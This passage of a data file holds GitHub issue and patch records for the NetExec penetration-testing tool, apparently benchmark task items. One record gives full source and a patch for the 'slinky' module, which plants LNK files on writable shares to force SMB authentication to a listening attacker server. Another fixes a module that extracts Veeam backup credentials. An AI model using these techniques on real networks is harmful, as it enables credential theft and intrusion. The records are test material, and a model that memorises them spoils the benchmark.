me, remote_name, remote_host, remote_type=remote_type,\n                    sess_port=sess_port,\n                        ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n                    ^\n                                                timeout=timeout, local_type=local_type, sock=sock)\n                                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n                      File \"C:\\Users\\reelix\\pipx\\venvs\\netexec\\Lib\\site-packages\\impacket\\nmb.py\", line 755, in __init__\n                        self._sock = self._setup_connection((remote_host, sess_port), timeout)\n                                     ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n                      File \"C:\\Users\\reelix\\pipx\\venvs\\netexec\\Lib\\site-packages\\impacket\\nmb.py\", line 907, in _setup_connection\n                        raise socket.error(\"Connection error (%s:%s)\" % (peer[0], peer[1]), e)\n                    OSError: [Errno Connection error (10.10.11.72:445)] timed out\n\n           WARNING  DCE/RPC connection failed: [Errno Connection error (10.10.11.72:445)] timed out                                  computer.py:442\n[15:48:59] DEBUG    DCE/RPC binding: ncacn_np:10.10.11.72[\\PIPE\\samr]                                                                computer.py:321\n[15:49:02] DEBUG    Opening domain handle                                                                                            computer.py:783\n[15:49:04] DEBUG    DCE/RPC binding: ncacn_np:10.10.11.72[\\PIPE\\samr]                                                                computer.py:321\n[15:49:06] DEBUG    Opening domain handle                                                                                            computer.py:783\n[15:49:07] DEBUG    DCE/RPC binding: ncacn_np:10.10.11.72[\\PIPE\\samr]                                                                computer.py:321\n[15:49:09] DEBUG    Opening domain handle                                                                                            computer.py:783\n[15:49:11] DEBUG    Found 580 SID: S-1-5-21-1392491010-1358638721-2126982587-1106                                                    computer.py:814\n           DEBUG    DCE/RPC binding: ncacn_np:10.10.11.72[\\PIPE\\lsarpc]                                                              computer.py:321\n[15:49:13] DEBUG    Resolved SID to name: JOHN@TOMBWATCHER.HTB                                                                       computer.py:903\n           DEBUG    Write worker obtained a None value, exiting                                                                   outputworker.py:57\n           DEBUG    Write worker is done, closing files                                                                           outputworker.py:88\n[15:49:13] INFO     LDAP        10.10.11.72     389    DC01             Done in 0M 57S                                             bloodhound.py:110\n[15:49:13] INFO     LDAP        10.10.11.72     389    DC01             Compressing output into                                         ldap.py:1436\n                    C-\\Users\\reelix\\.nxc/logs/DC01_10.10.11.72_2025-06-18_154815_bloodhound.zip\n           ERROR    Exception while calling proto_flow() on target 10.10.11.72: [Errno 2] No such file or directory:               connection.py:176\n                    'C-\\\\Users\\\\reelix\\\\.nxc/logs/DC01_10.10.11.72_2025-06-18_154815_bloodhound.zip'\n                    \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Traceback (most recent call last) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e\n                    \u2502 C:\\Users\\reelix\\pipx\\venvs\\netexec\\Lib\\site-packages\\nxc\\connection.py:168 in __init__                  \u2502\n                    \u2502                                                                                                            \u2502\n                    \u2502   165 \u2502   \u2502   self.logger.info(f\"Socket info: host={self.host}, hostname={self.hostname},                  \u2502\n                    \u2502       kerberos={self.kerberos}, ipv6={self.is_ipv6}, link-local                                            \u2502\n                    \u2502       ipv6={self.is_link_local_ipv6}\")                                                                     \u2502\n                    \u2502   166 \u2502   \u2502                                                                                                \u2502\n                    \u2502   167 \u2502   \u2502   try:                                                                                         \u2502\n                    \u2502 \u2771 168 \u2502   \u2502   \u2502   self.proto_flow()                                                                        \u2502\n                    \u2502   169 \u2502   \u2502   except Exception as e:                                                                       \u2502\n                    \u2502   170 \u2502   \u2502   \u2502   if \"ERROR_DEPENDENT_SERVICES_RUNNING\" in str(e):                                         \u2502\n                    \u2502   171 \u2502   \u2502   \u2502   \u2502   self.logger.error(f\"Exception while calling proto_flow() on target                   \u2502\n                    \u2502       {target}: {e}\")                                                                                      \u2502\n                    \u2502                                                                                                            \u2502\n                    \u2502 C:\\Users\\reelix\\pipx\\venvs\\netexec\\Lib\\site-packages\\nxc\\connection.py:242 in proto_flow                \u2502\n                    \u2502                                                                                                            \u2502\n                    \u2502   239 \u2502   \u2502   \u2502   \u2502   \u2502   self.call_modules()                                                              \u2502\n                    \u2502   240 \u2502   \u2502   \u2502   \u2502   else:                                                                                \u2502\n                    \u2502   241 \u2502   \u2502   \u2502   \u2502   \u2502   self.logger.debug(\"Calling command arguments\")                                   \u2502\n                    \u2502 \u2771 242 \u2502   \u2502   \u2502   \u2502   \u2502   self.call_cmd_args()                                                             \u2502\n                    \u2502   243 \u2502   \u2502   \u2502   self.disconnect()                                                                        \u2502\n                    \u2502   244 \u2502                                                                                                    \u2502\n                    \u2502   245 \u2502   def call_cmd_args(self):                                                                         \u2502\n                    \u2502                                                                                                            \u2502\n                    \u2502 C:\\Users\\reelix\\pipx\\venvs\\netexec\\Lib\\site-packages\\nxc\\connection.py:264 in call_cmd_args             \u2502\n                    \u2502                                                                                                            \u2502\n                    \u2502   261 \u2502   \u2502   for attr, value in vars(self.args).items():                                                  \u2502\n                    \u2502   262 \u2502   \u2502   \u2502   if hasattr(self, attr) and callable(getattr(self, attr)) and value is not                \u2502\n                    \u2502       False and value is not None:                                                                         \u2502\n                    \u2502   263 \u2502   \u2502   \u2502   \u2502   self.logger.debug(f\"Calling {attr}()\")                                               \u2502\n                    \u2502 \u2771 264 \u2502   \u2502   \u2502   \u2502   getattr(self, attr)()                                                                \u2502\n                    \u2502   265 \u2502                                                                                                    \u2502\n                    \u2502   266 \u2502   def call_modules(self):                                                                          \u2502\n                    \u2502   267 \u2502   \u2502   \"\"\"Calls modules and performs various actions based on the module's attributes.              \u2502\n                    \u2502                                                                                                            \u2502\n                    \u2502 C:\\Users\\reelix\\pipx\\venvs\\netexec\\Lib\\site-packages\\nxc\\protocols\\ldap.py:1438 in bloodhound           \u2502\n                    \u2502                                                                                                            \u2502\n                    \u2502   1435 \u2502   \u2502                                                                                               \u2502\n                    \u2502   1436 \u2502   \u2502   self.logger.highlight(f\"Compressing output into                                             \u2502\n                    \u2502        {self.output_filename}bloodhound.zip\")                                                              \u2502\n                    \u2502   1437 \u2502   \u2502   list_of_files = os.listdir(os.getcwd())                                                     \u2502\n                    \u2502 \u2771 1438 \u2502   \u2502   with ZipFile(self.output_filename + \"bloodhound.zip\", \"w\") as z:                            \u2502\n                    \u2502   1439 \u2502   \u2502   \u2502   for each_file in list_of_files:                                                         \u2502\n                    \u2502   1440 \u2502   \u2502   \u2502   \u2502   if each_file.startswith(self.output_filename.split(\"/\")[-1]) and                    \u2502\n                    \u2502        each_file.endswith(\"json\"):                                                                         \u2502\n                    \u2502   1441 \u2502   \u2502   \u2502   \u2502   \u2502   z.write(each_file)                                                              \u2502\n                    \u2502                                                                                                            \u2502\n                    \u2502 C:\\Program                                                                                                 \u2502\n                    \u2502 Files\\WindowsApps\\PythonSoftwareFoundation.Python.3.13_3.13.1520.0_x64__qbz5n2kfra8p0\\Lib\\zipfile\\__init__ \u2502\n                    \u2502 .py:1367 in __init__                                                                                       \u2502\n                    \u2502                                                                                                            \u2502\n                    \u2502   1364 \u2502   \u2502   \u2502   filemode = modeDict[mode]                                                               \u2502\n                    \u2502   1365 \u2502   \u2502   \u2502   while True:                                                                             \u2502\n                    \u2502   1366 \u2502   \u2502   \u2502   \u2502   try:                                                                                \u2502\n                    \u2502 \u2771 1367 \u2502   \u2502   \u2502   \u2502   \u2502   self.fp = io.open(file, filemode)                                               \u2502\n                    \u2502   1368 \u2502   \u2502   \u2502   \u2502   except OSError:                                                                     \u2502\n                    \u2502   1369 \u2502   \u2502   \u2502   \u2502   \u2502   if filemode in modeDict:                                                        \u2502\n                    \u2502   1370 \u2502   \u2502   \u2502   \u2502   \u2502   \u2502   filemode = modeDict[filemode]                                               \u2502\n                    \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f\n                    FileNotFoundError: [Errno 2] No such file or directory:\n                    'C-\\\\Users\\\\reelix\\\\.nxc/logs/DC01_10.10.11.72_2025-06-18_154815_bloodhound.zip'\n           DEBUG    Closing connection to: 10.10.11.72\n```\n\nWhilst there are a few timeouts to 445, I suspect the main issue is\n\n`C-\\Users\\reelix\\.nxc/logs/DC01_10.10.11.72_2025-06-18_154815_bloodhound.zip`\n\nWhich is an invalid path (`C-\\` VS `C:\\`)\n\nCaused by \n\nhttps://github.com/Pennyw0rth/NetExec/blob/9ca183d5493e344241793019750b0680f6ecbe63/nxc/protocols/ldap.py#L326\n\nWhich is ironically intended to fix invalid paths.\n\n**Expected behavior**\nThe command runs, and the resultant .zip file is created\n\n**Screenshots**\nN/A - Attached log file\n\n**NetExec info**\n - OS: Windows\n - Version of nxc: 1.4.0 - SmoothOperator - 9ca183d5 - 419\n - Version of python: Python 3.13.5\n - Installed from: apt/github/pip/docker/...? pipx from Github\n", "hints_text": "\n\n", "all_hints_text": "Thanks for reporting! Should be fixed in #750\n\n", "commit_urls": ["https://github.com/Pennyw0rth/NetExec/commit/d317d4993f343719b06adbdd013af79abacbfa18", "https://github.com/Pennyw0rth/NetExec/commit/e87e80a58dcf35cafacf0241a92ab83c50eec59c"], "created_at": "2025-06-19T17:56:04Z"}
{"repo": "Pennyw0rth/NetExec", "pull_number": 777, "instance_id": "Pennyw0rth__NetExec-777", "issue_numbers": [771], "base_commit": "bbca423a1e1099551cdf1de0ad6cda91fcaef1c4", "patch": "diff --git a/nxc/protocols/smb.py b/nxc/protocols/smb.py\nindex dfca0cc20a..fe77919f10 100755\n--- a/nxc/protocols/smb.py\n+++ b/nxc/protocols/smb.py\n@@ -964,15 +964,19 @@ def enumerate_sessions_info(self, sessions):\n                     sessions[SessionId][\"DisconnectTime\"] = sessdata[\"LSMSessionInfoExPtr\"][\"LSM_SessionInfo_Level1\"][\"DisconnectTime\"]\n                     sessions[SessionId][\"LogonTime\"] = sessdata[\"LSMSessionInfoExPtr\"][\"LSM_SessionInfo_Level1\"][\"LogonTime\"]\n                     sessions[SessionId][\"LastInputTime\"] = sessdata[\"LSMSessionInfoExPtr\"][\"LSM_SessionInfo_Level1\"][\"LastInputTime\"]\n-            with TSTS.RCMPublic(self.conn, self.host, self.kerberos) as rcm:\n-                for SessionId in sessions:\n-                    try:\n-                        client = rcm.hRpcGetRemoteAddress(SessionId)\n-                        if not client:\n-                            continue\n-                        sessions[SessionId][\"RemoteIp\"] = client[\"pRemoteAddress\"][\"ipv4\"][\"in_addr\"]\n-                    except Exception as e:\n-                        self.logger.debug(f\"Error getting client address for session {SessionId}: {e}\")\n+            \n+            try:\n+                with TSTS.RCMPublic(self.conn, self.host, self.kerberos) as rcm:\n+                    for SessionId in sessions:\n+                        try:\n+                            client = rcm.hRpcGetRemoteAddress(SessionId)\n+                            if not client:\n+                                continue\n+                            sessions[SessionId][\"RemoteIp\"] = client[\"pRemoteAddress\"][\"ipv4\"][\"in_addr\"]\n+                        except Exception as e:\n+                            self.logger.debug(f\"Error getting client address for session {SessionId}: {e}\")\n+            except SessionError:\n+                self.logger.fail(\"RDP is probably not enabled, cannot list remote IPv4 addresses.\")\n \n     @requires_admin\n     def qwinsta(self):\n@@ -1056,31 +1060,34 @@ def qwinsta(self):\n \n     @requires_admin\n     def tasklist(self):\n-        with TSTS.LegacyAPI(self.conn, self.host, self.kerberos) as legacy:\n-            try:\n-                handle = legacy.hRpcWinStationOpenServer()\n-                res = legacy.hRpcWinStationGetAllProcesses(handle)\n-            except Exception as e:\n-                # TODO: Issue https://github.com/fortra/impacket/issues/1816\n-                self.logger.debug(f\"Exception while calling hRpcWinStationGetAllProcesses: {e}\")\n-                return\n-            if not res:\n-                return\n-            self.logger.success(\"Enumerated processes\")\n-            maxImageNameLen = max(len(i[\"ImageName\"]) for i in res)\n-            maxSidLen = max(len(i[\"pSid\"]) for i in res)\n-            template = \"{: <%d} {: <8} {: <11} {: <%d} {: >12}\" % (maxImageNameLen, maxSidLen)  # noqa: UP031\n-            self.logger.highlight(template.format(\"Image Name\", \"PID\", \"Session#\", \"SID\", \"Mem Usage\"))\n-            self.logger.highlight(template.replace(\": \", \":=\").format(\"\", \"\", \"\", \"\", \"\"))\n-            for procInfo in res:\n-                row = template.format(\n-                    procInfo[\"ImageName\"],\n-                    procInfo[\"UniqueProcessId\"],\n-                    procInfo[\"SessionId\"],\n-                    procInfo[\"pSid\"],\n-                    \"{:,} K\".format(procInfo[\"WorkingSetSize\"] // 1000),\n-                )\n-                self.logger.highlight(row)\n+        try:\n+            with TSTS.LegacyAPI(self.conn, self.host, self.kerberos) as legacy:\n+                try:\n+                    handle = legacy.hRpcWinStationOpenServer()\n+                    res = legacy.hRpcWinStationGetAllProcesses(handle)\n+                except Exception as e:\n+                    # TODO: Issue https://github.com/fortra/impacket/issues/1816\n+                    self.logger.debug(f\"Exception while calling hRpcWinStationGetAllProcesses: {e}\")\n+                    return\n+                if not res:\n+                    return\n+                self.logger.success(\"Enumerated processes\")\n+                maxImageNameLen = max(len(i[\"ImageName\"]) for i in res)\n+                maxSidLen = max(len(i[\"pSid\"]) for i in res)\n+                template = \"{: <%d} {: <8} {: <11} {: <%d} {: >12}\" % (maxImageNameLen, maxSidLen)  # noqa: UP031\n+                self.logger.highlight(template.format(\"Image Name\", \"PID\", \"Session#\", \"SID\", \"Mem Usage\"))\n+                self.logger.highlight(template.replace(\": \", \":=\").format(\"\", \"\", \"\", \"\", \"\"))\n+                for procInfo in res:\n+                    row = template.format(\n+                        procInfo[\"ImageName\"],\n+                        procInfo[\"UniqueProcessId\"],\n+                        procInfo[\"SessionId\"],\n+                        procInfo[\"pSid\"],\n+                        \"{:,} K\".format(procInfo[\"WorkingSetSize\"] // 1000),\n+                    )\n+                    self.logger.highlight(row)\n+        except SessionError:\n+            self.logger.fail(\"Cannot list remote tasks, RDP is probably disabled.\")\n \n     def shares(self):\n         temp_dir = ntpath.normpath(\"\\\\\" + gen_random_string())\n", "test_patch": "", "problem_statement": "About --qwinsta --tasklist\nSmall issue so that I can keep tracks of things I have got to work on ahah.\n\nBasically I realised that --qwinsta crashes if RDP is not enabled on the remote target. That's because in order to list active sessions, qwisnta relies on the following named pipe:\n\n![Image](https://github.com/user-attachments/assets/0f07a9cc-bbe5-4968-a2d9-1856b4edbe86)\n\nThat is linked to RDP.\n\nSo:\n\n* Either we switch the --qwinsta and --tasklist functions to the RDP protocol ;\n* We add a try catch aroung that call which is actually done on line 909 smb.py:\n\n![Image](https://github.com/user-attachments/assets/ed434b93-6306-46bf-848e-233dda315b45)\n", "hints_text": "I'm actually super dumb lol. This is definitely a SMB option as it relies on named pipes. However, if RDP is not enabled, the named pipe is not spawned. As such, I'll just have to add a try catch to make sure it doesn't crash everything if RDP is not enbaled :)!\n\n", "all_hints_text": "I'm actually super dumb lol. This is definitely a SMB option as it relies on named pipes. However, if RDP is not enabled, the named pipe is not spawned. As such, I'll just have to add a try catch to make sure it doesn't crash everything if RDP is not enbaled :)!\n\n", "commit_urls": ["https://github.com/Pennyw0rth/NetExec/commit/9e8ae0364dfd39f2d4219804351ad0b82f267ff3"], "created_at": "2025-07-04T13:35:26Z"}
{"repo": "Pennyw0rth/NetExec", "pull_number": 800, "instance_id": "Pennyw0rth__NetExec-800", "issue_numbers": [780], "base_commit": "e99e5c244c67421b4143aa8f3e3433b18a06e325", "patch": "diff --git a/nxc/modules/slinky.py b/nxc/modules/slinky.py\nindex 1e9f0012b9..0ddff60985 100644\n--- a/nxc/modules/slinky.py\n+++ b/nxc/modules/slinky.py\n@@ -66,9 +66,8 @@ def options(self, context, module_options):\n \n         if not self.cleanup:\n             self.server = module_options[\"SERVER\"]\n-            link = pylnk3.create(self.local_lnk_path)\n-            link.icon = self.ico_uri if self.ico_uri else f\"\\\\\\\\{self.server}\\\\icons\\\\icon.ico\"\n-            link.save()\n+            target_path = f\"\\\\\\\\{self.server}\\\\share\\\\{self.lnk_name}.ico\"\n+            pylnk3.for_file(target_path, self.local_lnk_path)\n \n     def on_login(self, context, connection):\n         shares = connection.shares()\n", "test_patch": "", "problem_statement": "LNK files generated by Slinky (pylnk3) not reliably triggering SMB connections\nThis is a mix of Bug Report and Feature Request.\n\n**Description:**\n\nThe `.lnk` files generated by Slinky (via `pylnk3`) currently only set the **IconLocation** field to point to a remote SMB resource. While this approach can sometimes trigger SMB authentication attempts (for example, when Windows Explorer loads icons), this seems to be highly unreliable:\n\n- Modern Windows versions often **disable icon loading from network locations** for security reasons.\n- Many systems do not trigger SMB connections simply by browsing to the folder containing the `.lnk` file, unless the icon is explicitly loaded.\n- This method depends heavily on Windows Explorer behavior, which varies between versions, user settings, and environment.\n\nIn contrast, setting the **TargetPath** of the `.lnk` file to a remote UNC path (e.g., `\\\\192.168.1.100\\share`) is much more consistent:\n- Windows will attempt to resolve the TargetPath, often even when merely listing the directory.\n- This reliably triggers SMB authentication attempts across most Windows versions and configurations.\n\n---\n\n**Steps to Reproduce:**\n\n1. Use Slinky to generate a `.lnk` file with default behavior (IconLocation-based).\n2. Place the file in a shared folder or directory.\n3. Browse to the directory on a modern Windows machine.\n\n**Expected behavior:**\nAn SMB authentication attempt is triggered automatically.\n\n**Actual behavior:**\nIn many cases, no SMB connection is triggered, especially on modern systems.\nThis was discovered during a recent pentest in a modern environment.\n\n**Cross-Check:**\n`.lnk` files created with this powershell script, worked flawlessly.\n\n```powershell\n$objShell = New-Object -ComObject WScript.Shell\n$lnk = $objShell.CreateShortcut(\"C:\\Users\\Whatever\\Desktop\\@test.lnk\")\n$lnk.TargetPath = \"\\\\10.0.3.99\\@threat.png\"\n$lnk.WindowStyle = 1\n$lnk.IconLocation = \"%windir%\\system32\\shell32.dll, 3\"\n$lnk.Description = \"Browsing to the dir this file lives in will perform an authentication request.\"\n$lnk.HotKey = \"Ctrl+Alt+O\"\n$lnk.Save()\n```\n\n\n**Proposed Solution 1:**\n\nSet the **TargetPath** instead of (or in addition to) IconLocation to a UNC path by default if that's supported by `pylnk3`. Based on my research, this might not be possible.\n\n**Proposed Solution 2:**\n\nAdd an option to upload user provided `.lnk` files. Such as one generated by powershell. I did a quick mockup which actually worked as expected. However, my coding/github pull request skills are not where they should be.\n\nSo here's my modified slinky code for your reference:\n\n```\nimport pylnk3\nimport ntpath\nfrom sys import exit\nfrom nxc.paths import TMP_PATH\n\n\nclass NXCModule:\n    \"\"\"\n    Original idea and PoC by Justin Angel (@4rch4ngel86)\n    Module by @byt3bl33d3r\n    Updated by @Marshall-Hallenbeck\n    Extended by @tagnullde and @clipsec : Added UPLOAD_ONLY mode for uploading existing LNK files\n    \"\"\"\n\n    name = \"slinky\"\n    description = \"Creates windows shortcuts with the icon attribute containing a URI to the specified server (default SMB) in all shares with write permissions. Supports UPLOAD_ONLY mode for existing LNK files.\"\n    supported_protocols = [\"smb\"]\n    opsec_safe = False\n    multiple_hosts = True\n\n    def __init__(self):\n        self.server = None\n        self.remote_file_path = None\n        self.local_lnk_path = None\n        self.lnk_name = None\n        self.ico_uri = None\n        self.shares = None\n        self.ignore_shares = [\"C$\", \"ADMIN$\", \"NETLOGON\", \"SYSVOL\"]\n        self.cleanup = None\n        self.upload_only = False  # NEU\n\n    def options(self, context, module_options):\n        r\"\"\"\n        SERVER        IP of the listening server (running Responder, etc)\n        NAME          LNK file name written to the share(s)\n        ICO_URI       Override full ICO path (e.g. http://192.168.1.2/evil.ico or \\\\\\\\192.168.1.2\\\\testing_path\\\\icon.ico)\n        SHARES        Specific shares to write to (comma separated, e.g. SHARES=share1,share2,share3)\n        IGNORE        Specific shares to ignore (comma separated, default: C$,ADMIN$,NETLOGON,SYSVOL)\n        CLEANUP       Cleanup (choices: True or False)\n        UPLOAD_ONLY   Upload existing local LNK file instead of generating one (choices: True or False)\n        LOCAL_FILE    Path to the local LNK file to upload in UPLOAD_ONLY mode\n        \"\"\"\n        self.cleanup = False\n\n        if \"CLEANUP\" in module_options:\n            self.cleanup = bool(module_options[\"CLEANUP\"])\n            context.log.debug(\"Cleanup set to True\")\n\n        if \"UPLOAD_ONLY\" in module_options:\n            self.upload_only = bool(module_options[\"UPLOAD_ONLY\"])\n            context.log.debug(\"Upload-only mode activated\")\n\n        if self.upload_only:\n            if \"LOCAL_FILE\" not in module_options:\n                context.log.fail(\"LOCAL_FILE option is required in UPLOAD_ONLY mode!\")\n                exit(1)\n            self.local_lnk_path = module_options[\"LOCAL_FILE\"]\n            self.remote_file_path = ntpath.join(\"\\\\\", ntpath.basename(self.local_lnk_path))\n            context.log.success(f\"Prepared to {'delete' if self.cleanup else 'upload'} local file: {self.local_lnk_path}\")\n        else:\n            if \"NAME\" not in module_options:\n                context.log.fail(\"NAME option is required!\")\n                exit(1)\n\n            if \"SHARES\" in module_options:\n                self.shares = module_options[\"SHARES\"].split(\",\")\n                context.log.debug(f\"Shares to write to: {self.shares}\")\n\n            if \"IGNORE\" in module_options:\n                self.ignore_shares = module_options[\"IGNORE\"].split(\",\")\n                context.log.debug(f\"Ignoring shares: {self.ignore_shares}\")\n\n            if not self.cleanup and \"SERVER\" not in module_options:\n                context.log.fail(\"SERVER option is required!\")\n                exit(1)\n\n            if \"ICO_URI\" in module_options:\n                self.ico_uri = module_options[\"ICO_URI\"]\n                context.log.debug(\"Overriding\")\n\n            self.lnk_name = module_options[\"NAME\"]\n            self.local_lnk_path = f\"{TMP_PATH}/{self.lnk_name}.lnk\"\n            self.remote_file_path = ntpath.join(\"\\\\\", f\"{self.lnk_name}.lnk\")\n\n            if not self.cleanup:\n                self.server = module_options[\"SERVER\"]\n                link = pylnk3.create(self.local_lnk_path)\n                link.icon = self.ico_uri if self.ico_uri else f\"\\\\\\\\{self.server}\\\\icons\\\\icon.ico\"\n                link.save()\n\n    def on_login(self, context, connection):\n        shares = connection.shares()\n        if shares:\n            slinky_logger = context.log.init_log_file()\n            context.log.add_file_log(slinky_logger)\n\n            for share in shares:\n                if \"WRITE\" in share[\"access\"] and share[\"name\"] not in self.ignore_shares:\n                    if self.shares is not None and share[\"name\"] not in self.shares:\n                        context.log.debug(f\"Did not write to {share['name']} share as it was not specified in the SHARES option\")\n                        continue\n\n                    context.log.success(f\"Found writable share: {share['name']}\")\n                    if not self.cleanup:\n                        with open(self.local_lnk_path, \"rb\") as lnk:\n                            try:\n                                connection.conn.putFile(share[\"name\"], self.remote_file_path, lnk.read)\n                                context.log.success(f\"Created LNK file on the {share['name']} share\")\n                            except Exception as e:\n                                context.log.fail(f\"Error writing LNK file to share {share['name']}: {e}\")\n                    else:\n                        try:\n                            connection.conn.deleteFile(share[\"name\"], self.remote_file_path)\n                            context.log.success(f\"Deleted LNK file on the {share['name']} share\")\n                        except Exception as e:\n                            context.log.fail(f\"Error deleting LNK file on share {share['name']}: {e}\")\n\n```\n\nUsage:\n\n<img width=\"1170\" height=\"24\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/305d29d0-f354-4780-9362-f7e09680f240\" />\n\n<img width=\"1157\" height=\"239\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/795d114d-41c5-41a8-aa0b-e5356926329b\" />\n\nCleanup:\n\n<img width=\"1273\" height=\"22\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/b30740c8-e703-4a6d-aff1-aadd4932c84d\" />\n\n<img width=\"1166\" height=\"221\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/56007637-80ff-4f45-9930-efb43761b5f5\" />\n", "hints_text": "Hi, thanks for the bug report or feature request!\n\nI think it should be doable with pylnk3 when we use the `for_file()` function, which is also called by the main script when creating files. There we can specify nearly any attribute of the created lnk file as far as i can tell.\n\nIf you want to create a POC and need help with the Pull Request process hit me up.\nThank you. Will look into it. Might take a bit, but I'll keep you updated.\nOn my experiments, an LNK with a target UNC triggers the SMB query immediately.\nHowever, when using a UNC icon the SMB query is triggered only when a user right-click the LNK file.\n\nI'd like to suggest a tiny patch to fix the issue described by tagnullde:\n\n```\ndiff orig_slinky.py new_slinky.py\n6d5\n<\n70,72c69,71\n<             link = pylnk3.create(self.local_lnk_path)\n<             link.icon = self.ico_uri if self.ico_uri else f\"\\\\\\\\{self.server}\\\\icons\\\\icon.ico\"\n<             link.save()\n---\n>\n>             target_path = f\"\\\\\\\\{self.server}\\\\share\\\\{self.lnk_name}.png\"\n>             pylnk3.for_file(target_path, self.local_lnk_path)\n```\nNice one! Could you open up a Pull Request?\nSure.\n\n\n\n", "all_hints_text": "Hi, thanks for the bug report or feature request!\n\nI think it should be doable with pylnk3 when we use the `for_file()` function, which is also called by the main script when creating files. There we can specify nearly any attribute of the created lnk file as far as i can tell.\n\nIf you want to create a POC and need help with the Pull Request process hit me up.\nThank you. Will look into it. Might take a bit, but I'll keep you updated.\nOn my experiments, an LNK with a target UNC triggers the SMB query immediately.\nHowever, when using a UNC icon the SMB query is triggered only when a user right-click the LNK file.\n\nI'd like to suggest a tiny patch to fix the issue described by tagnullde:\n\n```\ndiff orig_slinky.py new_slinky.py\n6d5\n<\n70,72c69,71\n<             link = pylnk3.create(self.local_lnk_path)\n<             link.icon = self.ico_uri if self.ico_uri else f\"\\\\\\\\{self.server}\\\\icons\\\\icon.ico\"\n<             link.save()\n---\n>\n>             target_path = f\"\\\\\\\\{self.server}\\\\share\\\\{self.lnk_name}.png\"\n>             pylnk3.for_file(target_path, self.local_lnk_path)\n```\nNice one! Could you open up a Pull Request?\nSure.\n\n\n\n", "commit_urls": ["https://github.com/Pennyw0rth/NetExec/commit/d5e6e6d6f300ca8054cb8bdb0d408541fc46481a", "https://github.com/Pennyw0rth/NetExec/commit/b974d3d67c908413f87a4e5c37ebc8f0a292f111", "https://github.com/Pennyw0rth/NetExec/commit/0565e4e176f5698c08b18b6bf9a076c5f9ea7828", "https://github.com/Pennyw0rth/NetExec/commit/d6fcee6c80ce669b08a3fc10e2b9f9ec5271ce90"], "created_at": "2025-07-16T09:15:02Z"}
{"repo": "Pennyw0rth/NetExec", "pull_number": 808, "instance_id": "Pennyw0rth__NetExec-808", "issue_numbers": [806], "base_commit": "da949f1875ab6a058f5f5421848b5904fdff9fab", "patch": "diff --git a/nxc/modules/veeam.py b/nxc/modules/veeam.py\nindex 1ea0dd9682..f9f29c856d 100644\n--- a/nxc/modules/veeam.py\n+++ b/nxc/modules/veeam.py\n@@ -117,7 +117,7 @@ def checkVeeamInstalled(self, context, connection):\n             credentials = self.executePsPostgreSql(connection, PostgreSqlExec, PostgresUserForWindowsAuth, SqlDatabaseName, salt)\n             self.printCreds(context, credentials)\n \n-    def get_salt(self, context, remoteOps, regHandle):\n+    def get_salt(self, context, remoteOps, regHandle) -> str:\n         try:\n             keyHandle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, \"SOFTWARE\\\\Veeam\\\\Veeam Backup and Replication\\\\Data\")[\"phkResult\"]\n             return rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, \"EncryptionSalt\")[1].split(\"\\x00\")[:-1][0]\n@@ -127,6 +127,7 @@ def get_salt(self, context, remoteOps, regHandle):\n         except Exception as e:\n             context.log.fail(f\"UNEXPECTED ERROR: {e}\")\n             context.log.debug(traceback.format_exc())\n+        return \"\"\n \n     def executePsMssql(self, connection, SqlDatabase, SqlInstance, SqlServer, salt):\n         self.psScriptMssql = self.psScriptMssql.replace(\"REPLACE_ME_SqlDatabase\", SqlDatabase)\n", "test_patch": "", "problem_statement": "error veeam module\nI repeatedly encounter an error when using the veeam module\nException while calling proto_flow() on target 192.168.1.3: replace() argument 2 must be str, not None\n\nkali, install from pipx\nVersion : 1.4.0\nCodename: SmoothOperator\nCommit : da949f18\n\n<img width=\"2130\" height=\"1179\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/84e993b3-e9af-416a-9b2f-d962803d7bc9\" />\n\n", "hints_text": "Thanks for the bug report!\n\nCould you provide the debug log?\nyes, of course\nthank you for your work\nI tried the previous version of nxc and also the binary version nxc.exe and this error was present in them too\n\n[debug.log](https://github.com/user-attachments/files/21292912/debug.log)\n\n\nYou might have luck with the v1.3.0 version but that is because the veeam version is probably out of date. At least the salt for the new encryption scheme is missing and that results in an error. Will fix it later the day!\n\n", "all_hints_text": "Thanks for the bug report!\n\nCould you provide the debug log?\nyes, of course\nthank you for your work\nI tried the previous version of nxc and also the binary version nxc.exe and this error was present in them too\n\n[debug.log](https://github.com/user-attachments/files/21292912/debug.log)\n\n\nYou might have luck with the v1.3.0 version but that is because the veeam version is probably out of date. At 